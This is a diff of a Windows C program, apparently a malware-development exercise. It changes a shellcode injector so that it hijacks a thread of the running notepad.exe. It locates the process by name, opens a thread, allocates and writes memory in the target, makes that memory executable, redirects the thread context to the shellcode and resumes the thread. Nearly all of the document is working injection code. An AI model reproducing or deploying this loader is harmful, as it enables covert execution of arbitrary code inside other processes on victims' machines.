@@ -1,65 +1,105 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <tlhelp32.h>
 
-/*
-Suspend then patch the rip register from a thread to point to the shellcode !
- - use GetThreadConext -> Populate CONTEXT struct (https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
- - then setThreadContext -> apply a said CONTEXT to a thread
-*/
-BOOL create_suspended_proc(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread){
-    CHAR				    lpPath          [MAX_PATH * 2];
-	CHAR				    WnDr            [MAX_PATH];
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
 
-	STARTUPINFO			    Si              = { 0 };
-	PROCESS_INFORMATION		Pi              = { 0 };
+DWORD get_pid_from_proc_name(IN LPCSTR lpProcessName) {
+    DWORD PID = 0;
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
 
-	// Cleaning the structs by setting the member values to 0
-	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to take snapshot\n");
+        return 0;
+    }
 
-	// Setting the size of the structure
-	Si.cb = sizeof(STARTUPINFO);
+    if (!Process32First(snapshot, &pe32)) {
+        printf("[-] Failed to get first process\n");
+        CloseHandle(snapshot);
+        return 0;
+    }
 
-	// Getting the value of the %WINDIR% environment variable
-    //Pour eviter le cas ou le systeme est pas sur C:\ par exemple
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
-		return FALSE;
+    do {
+        if (strcmpi(pe32.szExeFile, lpProcessName) == 0) {
+            printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
+            PID = pe32.th32ProcessID;
+            break;
+        }
+    } while (Process32Next(snapshot, &pe32));
+
+    CloseHandle(snapshot);
+    return PID;
+}
+
+BOOL get_proc_thread(IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread){
+    HANDLE         hSnapShot  = NULL;
+	/*
+	typedef struct tagTHREADENTRY32 {
+		DWORD dwSize;
+		DWORD cntUsage;
+		DWORD th32ThreadID;
+		DWORD th32OwnerProcessID;
+		LONG  tpBasePri;
+		LONG  tpDeltaPri;
+		DWORD dwFlags;
+	} THREADENTRY32;
+	*/
+	THREADENTRY32  Thr        = {
+		.dwSize = sizeof(THREADENTRY32)
+	};
+
+	DWORD PID = get_pid_from_proc_name(lpProcessName);
+
+	// Takes a snapshot of the currently running processes's threads 
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+	printf("[+] Snapshot taken w/ TH32CS_SNAPTHREAD \n");
+
+	// Retrieves information about the first thread encountered in the snapshot.
+	if (!Thread32First(hSnapShot, &Thr)) {
+		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
 	}
 
-	// Creating the full target process path 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
-	printf("\n\t[i] Running : \"%s\" ... \n", lpPath);
+	do {
+		// If the thread's PID is equal to the PID of the target process then
+		// this thread is running under the target process
+		if (Thr.th32OwnerProcessID == PID){
+			/*
+				THREAD_GET_CONTEXT
+				THREAD_SET_CONTEXT
+				THREAD_SUSPEND_RESUME
+			*/	
+			*hThread     = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, Thr.th32ThreadID);
+			printf("[+] Thread %d will be hijacked\n", Thr.th32ThreadID);
+			
+			if (*hThread == NULL)
+				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
 
-	if (!CreateProcessA(
-		NULL,					// No module name (use command line)
-		lpPath,					// Command line
-		NULL,					// Process handle not inheritable
-		NULL,					// Thread handle not inheritable
-		FALSE,					// Set handle inheritance to FALSE
-		CREATE_SUSPENDED,		// Creation flag
-		NULL,					// Use parent's environment block
-		NULL,					// Use parent's starting directory 
-		(LPSTARTUPINFOA)&Si,	// Pointer to STARTUPINFO structure
-		&Pi)) {					// Pointer to PROCESS_INFORMATION structure
+			break;
+		}
 
-		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
-		return FALSE;
-	}
+	// While there are threads remaining in the snapshot
+	} while (Thread32Next(hSnapShot, &Thr));
 
-	printf("[+] DONE \n");
+	/*
+		PROCESS_VM_OPERATION > pour VirtualAllocEx, VirtualProtectEx.
+		PROCESS_VM_WRITE > pour WriteProcessMemory.
+	*/
+	*hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
 
-	// Populating the OUT parameters with CreateProcessA's output
-	*dwProcessId    = Pi.dwProcessId;
-	*hProcess       = Pi.hProcess;
-	*hThread        = Pi.hThread;
-	
-	// Doing a check to verify we got everything we need
-	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
-		return TRUE;
-
-	return FALSE;
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	return TRUE;
 }
 
 int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
@@ -67,7 +107,7 @@ int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t 
     PVOID   pAddress        = NULL;
 	size_t   bytesWritten    = 0;
 	CONTEXT ThreadCtx       = { 
-		.ContextFlags = CONTEXT_CONTROL 
+		.ContextFlags = CONTEXT_FULL 
 	};
 
     // Allocating memory for the payload
@@ -81,6 +121,20 @@ int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t 
 	// Copying the payload to the allocated memory
 	WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &bytesWritten);
     printf("[+] Shellcode written in code cave\n");
+
+	// Changing the memory protection
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
+		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+    printf("[+] protection flag setted to RX \n");
+
+	if (!FlushInstructionCache(hProcess, pAddress, sPayloadSize)) {
+        printf("[-] FlushInstructionCache Failed : %lu\n", GetLastError());
+        // On continue quand même, mais c'est un red flag
+    }
+	SuspendThread(hThread);
+	printf("[+] Hijacked thread suspended !\n");
 
     // Getting the original thread context
 	if (!GetThreadContext(hThread, &ThreadCtx)){
@@ -99,12 +153,9 @@ int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t 
 		return FALSE;
 	}
     printf("[+] Hijacked context applied to thread !\n");
-    // Changing the memory protection
-	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
-    printf("[+] protection flag setted to RX \n");
+
+	ResumeThread(hThread);
+    printf("[+] hijacked thread resumed !\n");
 
 	return TRUE;
 }
@@ -142,9 +193,9 @@ int main(int argc, char** argv){
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
 
-    create_suspended_proc(lpProcessName, &dwProcessId, &hProcess, &hThread);
+    get_proc_thread("notepad.exe", &hProcess, &hThread);
 
-    printf("[+] Remote Process (%s) created !\n", lpProcessName);
+    printf("[+] Remote Process's thread obtained (%s) !\n", lpProcessName);
 
     if(!hijack_remote_dummy(hProcess, hThread, (PBYTE)&shellcode_64, shellcode_64_sz)) {
         printf("[-] hijack_dummy Failed : %d\n", GetLastError());
@@ -152,8 +203,6 @@ int main(int argc, char** argv){
     }
     printf("[+] Local Thread hijacked !\n");
 
-    ResumeThread(hThread);
-    printf("[+] hijacked thread resumed !\n");
     printf("[+] Waiting fo thread !\n");
     WaitForSingleObject(hThread, INFINITE);
     printf("[+] Done !\n");
